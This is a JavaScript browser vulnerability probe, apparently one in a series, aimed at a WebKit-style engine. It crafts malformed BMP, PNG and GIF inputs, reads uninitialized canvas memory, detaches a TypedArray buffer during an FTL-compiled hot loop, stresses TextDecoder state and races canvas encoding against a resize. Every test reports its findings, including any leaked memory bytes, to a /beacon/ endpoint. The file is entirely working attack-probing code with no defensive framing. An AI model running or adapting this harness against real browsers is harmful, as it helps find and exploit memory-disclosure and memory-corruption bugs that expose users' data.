/* p89-canvas — Canvas uninit memory + image parsers + FTL tier-up
 *
 * DFG is hardened. Pivoting to:
 * 1. Canvas uninitialized pixel buffer leak (known bug class)
 * 2. FTL JIT (needs 1M+ iterations to tier up from DFG)
 * 3. Malformed PNG/GIF/JPEG parsing
 * 4. TextDecoder streaming state confusion
 * 5. Canvas toBlob encoding path
 *
 * Beacon prefix: V89C-
 */
(function(){
"use strict";
var RUN_ID = "v89c" + Math.random().toString(36).slice(2,12);
var PREFIX = "V89C-";

function B(tag, body) {
  try {
    var d = typeof body === "object" ? JSON.stringify(body) : String(body);
    fetch("/beacon/" + PREFIX + tag, {
      method: "POST", body: JSON.stringify({r: RUN_ID, b: d.slice(0,1800)}),
      headers: {"Content-Type":"application/json"}
    }).catch(function(){});
  } catch(e){}
}
B("L", "press89-canvas+ftl");

/* ====== C1: Canvas uninitialized memory leak ====== */
function test_C1() {
  var r = {};
  try {
    // Create canvas, DON'T draw anything, read pixels
    // Should be all zeros. If not → uninitialized GPU/process memory leak
    var sizes = [[100,100], [1024,1024], [4096,1], [1,4096]];
    var results = [];

    for (var si = 0; si < sizes.length; si++) {
      var w = sizes[si][0], h = sizes[si][1];
      var canvas = document.createElement('canvas');
      canvas.width = w;
      canvas.height = h;
      var ctx = canvas.getContext('2d');

      // Read pixels without drawing
      var imgData = ctx.getImageData(0, 0, w, h);
      var data = imgData.data;

      var nonZero = 0;
      var sampleNonZero = [];
      for (var i = 0; i < data.length; i++) {
        if (data[i] !== 0) {
          nonZero++;
          if (sampleNonZero.length < 10) {
            sampleNonZero.push(i + ":" + data[i].toString(16));
          }
        }
      }

      results.push(w + "x" + h + ":nz=" + nonZero);
      if (nonZero > 0 && si === 0) {
        r.leakSamples = sampleNonZero.join("|");
      }
    }

    r.results = results.join("|");
    r.UNINIT_LEAK = results.some(function(s) { return s.indexOf("nz=0") === -1; });

    // Test 2: Create canvas, draw, clear, read — check for stale pixels
    var c2 = document.createElement('canvas');
    c2.width = 200; c2.height = 200;
    var ctx2 = c2.getContext('2d');
    ctx2.fillStyle = 'red';
    ctx2.fillRect(0, 0, 200, 200);

    // Clear by resizing (should reset backing store)
    c2.width = 200; // resize trick clears canvas
    var imgData2 = ctx2.getImageData(0, 0, 200, 200);
    var staleCount = 0;
    for (var j = 0; j < imgData2.data.length; j += 4) {
      if (imgData2.data[j] > 0) staleCount++; // red channel should be 0
    }
    r.staleAfterClear = staleCount;
    r.STALE_PIXELS = staleCount > 0;

  } catch(e) { r.err = e.name + ":" + e.message.slice(0,80); }
  B("C1-UNINIT", r);
}

/* ====== C2: Canvas OOB via drawImage with crafted source ====== */
function test_C2() {
  var r = {};
  try {
    // Draw crafted BMP with negative height to canvas
    // Then read pixels — if internal row calculation uses signed height...
    var rowBytes = 100 * 3;
    var padded = (rowBytes + 3) & ~3; // BMP rows are 4-byte aligned
    var pixelSize = padded * 100;
    var bmpSize = 54 + pixelSize;
    var buf = new ArrayBuffer(bmpSize);
    var dv = new DataView(buf);
    var u8 = new Uint8Array(buf);

    // BMP header
    dv.setUint8(0, 0x42); dv.setUint8(1, 0x4D);
    dv.setUint32(2, bmpSize, true);
    dv.setUint32(10, 54, true);
    dv.setUint32(14, 40, true);
    dv.setInt32(18, 100, true); // width
    dv.setInt32(22, -100, true); // NEGATIVE height
    dv.setUint16(26, 1, true);
    dv.setUint16(28, 24, true); // 24bpp
    dv.setUint32(34, pixelSize, true);

    // Fill pixel data with recognizable pattern
    for (var i = 54; i < bmpSize; i++) u8[i] = (i - 54) & 0xFF;

    var blob = new Blob([buf], { type: 'image/bmp' });
    createImageBitmap(blob).then(function(bmp) {
      r.bmpW = bmp.width;
      r.bmpH = bmp.height;

      var canvas = document.createElement('canvas');
      canvas.width = 200; canvas.height = 200;
      var ctx = canvas.getContext('2d');

      // Draw at various offsets including negative
      ctx.drawImage(bmp, 0, 0);
      var imgData = ctx.getImageData(0, 0, 200, 200);
      r.pixel_0_0_R = imgData.data[0];
      r.pixel_0_0_A = imgData.data[3];

      // Draw beyond canvas bounds
      ctx.drawImage(bmp, 150, 150); // partially outside
      var imgData2 = ctx.getImageData(0, 0, 200, 200);
      // Check corner pixel (should have BMP data)
      var cornerIdx = (150 * 200 + 150) * 4;
      r.corner_R = imgData2.data[cornerIdx];
      r.corner_A = imgData2.data[cornerIdx + 3];

      // putImageData with crafted data beyond bounds
      var craftedData = ctx.createImageData(300, 300); // larger than canvas
      for (var j = 0; j < craftedData.data.length; j++) craftedData.data[j] = 0x42;
      try {
        ctx.putImageData(craftedData, -50, -50); // negative offset
        r.putOOB = "ok";
        // Read back — check if anything leaked outside
        var after = ctx.getImageData(0, 0, 200, 200);
        r.afterPut_0_0 = after.data[0];
      } catch(e) {
        r.putErr = e.message.slice(0,40);
      }

      B("C2-DRAW-OOB", r);
    }).catch(function(e) {
      r.bmpErr = e.message.slice(0,60);
      B("C2-DRAW-OOB", r);
    });
  } catch(e) { r.err = e.message.slice(0,80); B("C2-DRAW-OOB", r); }
}

/* ====== C3: Malformed PNG parser ====== */
function test_C3() {
  var r = {};
  try {
    var results = [];

    function tryPNG(desc, chunks) {
      // Minimal PNG: signature + chunks
      var sig = new Uint8Array([137,80,78,71,13,10,26,10]);
      var parts = [sig];
      for (var i = 0; i < chunks.length; i++) parts.push(chunks[i]);
      var blob = new Blob(parts, { type: 'image/png' });
      return createImageBitmap(blob).then(function(bmp) {
        results.push(desc + ":OK:" + bmp.width + "x" + bmp.height);
      }).catch(function(e) {
        results.push(desc + ":ERR");
      });
    }

    function makeChunk(type, data) {
      var len = data.length;
      var buf = new ArrayBuffer(12 + len);
      var dv = new DataView(buf);
      var u8 = new Uint8Array(buf);
      dv.setUint32(0, len, false); // big-endian length
      u8[4] = type.charCodeAt(0);
      u8[5] = type.charCodeAt(1);
      u8[6] = type.charCodeAt(2);
      u8[7] = type.charCodeAt(3);
      for (var i = 0; i < data.length; i++) u8[8+i] = data[i];
      dv.setUint32(8 + len, 0, false); // CRC (0 = invalid, might be ignored)
      return u8;
    }

    // IHDR: width=100, height=100, bitdepth=8, colortype=2(RGB)
    var ihdr = new Uint8Array(13);
    var ihdrDV = new DataView(ihdr.buffer);
    ihdrDV.setUint32(0, 100, false);
    ihdrDV.setUint32(4, 100, false);
    ihdr[8] = 8; ihdr[9] = 2; // 8-bit RGB

    var iend = makeChunk("IEND", new Uint8Array(0));

    // Test 1: IHDR with huge dimensions
    var bigIhdr = new Uint8Array(13);
    var bigDV = new DataView(bigIhdr.buffer);
    bigDV.setUint32(0, 0x7FFFFFFF, false); // huge width
    bigDV.setUint32(4, 1, false);
    bigIhdr[8] = 8; bigIhdr[9] = 2;

    // Test 2: IHDR with zero dimensions
    var zeroIhdr = new Uint8Array(13);
    zeroIhdr[8] = 8; zeroIhdr[9] = 2;

    // Test 3: Negative IDAT length (but length is unsigned in PNG)
    var badIDAT = new Uint8Array(12);
    var badDV = new DataView(badIDAT.buffer);
    badDV.setUint32(0, 0xFFFFFFFF, false); // huge length
    badIDAT[4] = 73; badIDAT[5] = 68; badIDAT[6] = 65; badIDAT[7] = 84;

    Promise.all([
      tryPNG("huge-dim", [makeChunk("IHDR", bigIhdr), iend]),
      tryPNG("zero-dim", [makeChunk("IHDR", zeroIhdr), iend]),
      tryPNG("normal", [makeChunk("IHDR", ihdr), iend]),
      tryPNG("no-idat", [makeChunk("IHDR", ihdr), iend]),
      tryPNG("double-ihdr", [makeChunk("IHDR", ihdr), makeChunk("IHDR", ihdr), iend]),
    ]).then(function() {
      r.results = results.join("|");
      B("C3-PNG", r);
    });
  } catch(e) { r.err = e.message.slice(0,80); B("C3-PNG", r); }
}

/* ====== C4: FTL tier-up — very hot loop ====== */
function test_C4() {
  var r = {};
  try {
    // Need 1M+ executions to trigger FTL compilation (if enabled)
    // FTL has different optimization passes than DFG

    var arr = new Float64Array(64);
    for (var i = 0; i < 64; i++) arr[i] = i + 0.5;

    function hotLoop(a, n) {
      var sum = 0;
      for (var i = 0; i < n; i++) {
        sum += a[i % 64];
      }
      return sum;
    }

    // Phase 1: warm DFG (100K)
    var r1 = hotLoop(arr, 100000);
    r.phase1 = r1;

    // Phase 2: trigger FTL (2M more)
    var r2 = hotLoop(arr, 2000000);
    r.phase2 = r2;
    r.FTL_LIKELY = true; // if we got here without crash, FTL handled it

    // Phase 3: now test with type change under FTL
    var obj = { length: 64 };
    for (var j = 0; j < 64; j++) obj[j] = j + 0.5;
    // Add a getter that fires on specific index
    Object.defineProperty(obj, '32', {
      get: function() {
        // Side effect during FTL-compiled loop
        r.getterInFTL = true;
        return 999.999;
      }
    });

    var r3 = hotLoop(obj, 100);
    r.phase3 = r3;
    r.phase3Contains999 = r3 > 900;

    // Phase 4: Detach a TypedArray buffer during FTL loop
    var buf2 = new ArrayBuffer(512);
    var arr2 = new Float64Array(buf2);
    for (var k = 0; k < 64; k++) arr2[k] = k;

    function hotDetach(a, n) {
      var sum = 0;
      for (var i = 0; i < n; i++) {
        sum += a[i % 64];
        if (i === 500000) {
          // Detach mid-loop — FTL might not check between iterations
          try { structuredClone(a.buffer, { transfer: [a.buffer] }); } catch(e) {}
        }
      }
      return sum;
    }

    try {
      var r4 = hotDetach(arr2, 1000000);
      r.phase4 = r4;
      r.phase4Type = typeof r4;
      r.buf2Detached = buf2.byteLength === 0;
      r.FTL_DETACH_OK = true;
    } catch(e) {
      r.phase4Err = e.name + ":" + e.message.slice(0,40);
    }

  } catch(e) { r.err = e.name + ":" + e.message.slice(0,80); }
  B("C4-FTL", r);
}

/* ====== C5: TextDecoder streaming state confusion ====== */
function test_C5() {
  var r = {};
  try {
    // TextDecoder in streaming mode maintains internal state
    // Feed it partial multi-byte sequences, then switch encoding?
    var dec = new TextDecoder('utf-8', { fatal: false });

    // Feed partial UTF-8: first byte of 3-byte sequence
    var partial1 = new Uint8Array([0xE4]); // first byte of U+4E16 (世)
    var r1 = dec.decode(partial1, { stream: true });
    r.partial1 = r1.length; // should be 0 (waiting for more bytes)

    // Feed WRONG continuation (not valid UTF-8)
    var bad = new Uint8Array([0x41, 0x42]); // 'AB' (not continuation bytes)
    var r2 = dec.decode(bad, { stream: true });
    r.afterBad = r2.length;
    r.afterBadHex = [];
    for (var i = 0; i < r2.length; i++) r.afterBadHex.push(r2.charCodeAt(i).toString(16));
    r.afterBadHex = r.afterBadHex.join(",");

    // Feed a huge number of partial sequences without flushing
    var dec2 = new TextDecoder('utf-8', { fatal: false });
    for (var j = 0; j < 10000; j++) {
      dec2.decode(new Uint8Array([0xE4]), { stream: true });
    }
    // Now flush
    var flush = dec2.decode(new Uint8Array(0));
    r.flushLen = flush.length;
    r.DECODER_OVERFLOW = flush.length > 10000;

    // TextDecoder with huge buffer
    try {
      var hugeBuf = new ArrayBuffer(16 * 1024 * 1024); // 16MB
      var hugeView = new Uint8Array(hugeBuf);
      hugeView.fill(0x41); // all 'A'
      var dec3 = new TextDecoder('utf-8');
      var decoded = dec3.decode(hugeView);
      r.hugeDecLen = decoded.length;
      r.HUGE_OK = decoded.length === 16 * 1024 * 1024;
    } catch(e) {
      r.hugeErr = e.message.slice(0,40);
    }

  } catch(e) { r.err = e.name + ":" + e.message.slice(0,80); }
  B("C5-TEXTDEC", r);
}

/* ====== C6: Canvas toBlob/toDataURL race ====== */
function test_C6() {
  var r = {};
  try {
    var canvas = document.createElement('canvas');
    canvas.width = 100; canvas.height = 100;
    var ctx = canvas.getContext('2d');

    // Draw something
    ctx.fillStyle = '#FF0000';
    ctx.fillRect(0, 0, 100, 100);

    // toDataURL — synchronous pixel read
    var dataUrl = canvas.toDataURL('image/png');
    r.dataUrlLen = dataUrl.length;
    r.dataUrlStart = dataUrl.slice(0, 30);

    // toBlob — asynchronous, might have race with DOM manipulation
    var blobReady = false;
    canvas.toBlob(function(blob) {
      r.blobSize = blob.size;
      r.blobType = blob.type;
      blobReady = true;

      // Read the blob back and check for unexpected data
      var reader = new FileReader();
      reader.onload = function() {
        var arr = new Uint8Array(reader.result);
        // Check PNG signature
        r.isPNG = arr[0] === 137 && arr[1] === 80;
        B("C6-TOBLOB", r);
      };
      reader.readAsArrayBuffer(blob);
    }, 'image/png');

    // While toBlob is encoding, modify the canvas
    ctx.fillStyle = '#0000FF';
    ctx.fillRect(0, 0, 100, 100);
    // And resize (might invalidate the encoding buffer)
    canvas.width = 50;
    r.resizedDuring = true;

    // Fallback beacon if toBlob never fires
    setTimeout(function() {
      if (!blobReady) {
        r.TOBLOB_FAILED = true;
        B("C6-TOBLOB", r);
      }
    }, 2000);

  } catch(e) { r.err = e.message.slice(0,80); B("C6-TOBLOB", r); }
}

/* ====== C7: GIF malformed decoder ====== */
function test_C7() {
  var r = {};
  try {
    var results = [];

    function tryGIF(desc, data) {
      var blob = new Blob([new Uint8Array(data)], { type: 'image/gif' });
      return createImageBitmap(blob).then(function(bmp) {
        results.push(desc + ":OK:" + bmp.width + "x" + bmp.height);
      }).catch(function(e) {
        results.push(desc + ":ERR");
      });
    }

    // Minimal GIF89a header
    var gifHeader = [
      0x47, 0x49, 0x46, 0x38, 0x39, 0x61, // GIF89a
      0x01, 0x00, // width=1
      0x01, 0x00, // height=1
      0x80, // GCT flag, 1 bit color
      0x00, // bg color index
      0x00, // pixel aspect ratio
      0x00, 0x00, 0x00, // color 0 (black)
      0xFF, 0xFF, 0xFF, // color 1 (white)
    ];

    // Minimal image block
    var imgBlock = [
      0x2C, // image separator
      0x00, 0x00, // left
      0x00, 0x00, // top
      0x01, 0x00, // width=1
      0x01, 0x00, // height=1
      0x00, // no local color table
      0x02, // LZW minimum code size
      0x02, 0x44, 0x01, // compressed data
      0x00, // block terminator
      0x3B  // GIF trailer
    ];

    // Normal GIF
    var normalGif = gifHeader.concat(imgBlock);

    // GIF with huge dimensions
    var hugeGif = gifHeader.slice();
    hugeGif[6] = 0xFF; hugeGif[7] = 0xFF; // width=65535
    hugeGif[8] = 0xFF; hugeGif[9] = 0xFF; // height=65535
    hugeGif = hugeGif.concat(imgBlock);

    // GIF with image block larger than logical screen
    var oobGif = gifHeader.slice();
    var oobImg = imgBlock.slice();
    oobImg[3] = 0x00; oobImg[4] = 0x10; // left=4096 (way past width=1)
    oobGif = oobGif.concat(oobImg);

    // GIF with truncated LZW data
    var truncGif = gifHeader.concat([
      0x2C, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00,
      0x02, // LZW min code
      0xFF, // sub-block: 255 bytes follow (but we won't give them)
    ]);

    Promise.all([
      tryGIF("normal", normalGif),
      tryGIF("huge", hugeGif),
      tryGIF("oob-pos", oobGif),
      tryGIF("truncated", truncGif),
    ]).then(function() {
      r.results = results.join("|");
      B("C7-GIF", r);
    });
  } catch(e) { r.err = e.message.slice(0,80); B("C7-GIF", r); }
}

/* ====== Run ====== */
try {
  test_C1();
  setTimeout(test_C2, 300);
  setTimeout(test_C3, 1500);
  setTimeout(test_C4, 2500);
  setTimeout(test_C5, 6000);
  setTimeout(test_C6, 7000);
  setTimeout(test_C7, 8000);
} catch(e) { B("FATAL", String(e).slice(0,200)); }

var hbI = setInterval(function(){ B("HB","hb"); }, 3000);
setTimeout(function(){ clearInterval(hbI); B("Z2","probe89-done"); }, 28000);
})();
